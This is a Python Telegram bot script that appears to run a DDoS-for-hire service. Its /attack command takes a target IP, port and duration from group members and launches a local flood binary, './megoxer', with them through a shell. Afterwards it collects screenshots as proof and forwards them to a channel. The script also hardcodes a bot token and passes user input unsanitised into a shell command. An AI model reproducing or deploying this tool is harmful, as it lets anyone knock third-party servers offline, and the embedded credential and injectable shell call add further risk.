#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
import requests
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('8048715452:AAEdWGG7J-d1zVvmFSN1UiddyABpm34aLj0')

# Admin user IDs
admin_id = ["7129010361"]

# Group and channel details
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"

# Attack settings
ATTACK_LIMIT = 10  # Max attacks per day

# Global attack tracker
is_attack_running = False  # Track if an attack is running
attack_end_time = None  # Store attack end time
attack_target = None  # Store attack target IP
attack_port = None  # Store attack port
attack_duration = None  # Store attack duration
pending_feedback = {}  # Users who need to send screenshots

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global is_attack_running, attack_end_time, attack_target, attack_port, attack_duration
    user_id = str(message.from_user.id)
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀** ❌")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ **𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐀𝐍 𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆! 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓.**")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack `<IP>` `<PORT>` `<TIME>`")
        return

    attack_target, attack_port, attack_duration = command[1], command[2], command[3]

    try:
        attack_port = int(attack_port)
        attack_duration = int(attack_duration)
    except ValueError:
        bot.reply_to(message, "❌ **𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!**")
        return

    if attack_duration > 180:
        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 180𝐬!**")
        return

    # Mark attack as running
    is_attack_running = True
    attack_end_time = time.time() + attack_duration  # Store attack end time
    pending_feedback[user_id] = True  # Require screenshot

    bot.send_message(message.chat.id, f"🚀 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!**\n🎯 **Target:** `{attack_target}`\n🔹 **Port:** `{attack_port}`\n⏳ **Duration:** `{attack_duration}s`")

    try:
        subprocess.run(f"./megoxer {attack_target} {attack_port} {attack_duration} 900", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
        is_attack_running = False  # Reset flag
        return

    bot.send_message(message.chat.id, "✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐎𝐍𝐄! 𝐀𝐁 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄!** 🚀")

    is_attack_running = False  # Reset flag after attack completes

@bot.message_handler(commands=['check'])
def check_attack_status(message):
    global is_attack_running, attack_end_time, attack_target, attack_port, attack_duration

    if is_attack_running:
        remaining_time = int(attack_end_time - time.time())
        if remaining_time > 0:
            bot.reply_to(message, f"⚡ **Attack is Running!**\n🎯 **Target:** `{attack_target}`\n🔹 **Port:** `{attack_port}`\n⏳ **Duration:** `{attack_duration}s`\n🕒 **Time Left:** `{remaining_time}s`")
        else:
            bot.reply_to(message, "✅ **No attack is currently running.**")
            is_attack_running = False
    else:
        bot.reply_to(message, "✅ **No attack is currently running.**")

@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)

        bot.send_message(CHANNEL_USERNAME, f"📸 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃!**\n👤 `{user_id}`")

        bot.reply_to(message, "✅ **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐑𝐄𝐂𝐄𝐈𝐕𝐄𝐃! 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐆𝐀𝐎!** 🚀")
        del pending_feedback[user_id]
    else:
        bot.reply_to(message, "❌ **𝐘𝐞 𝐀𝐏𝐏𝐑𝐎𝐏𝐑𝐈𝐀𝐓𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈!**")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"🌟🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐑𝐎 {user_name} 🔥🌟\n\n🚀 **𝐘𝐨𝐮'𝐫𝐞 𝐢𝐧 𝐓𝐡𝐞 𝐇𝐎𝐌𝐄 𝐨𝐟 𝐏𝐎𝐖𝐄𝐑!**"
    
    bot.reply_to(message, response, parse_mode="Markdown")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)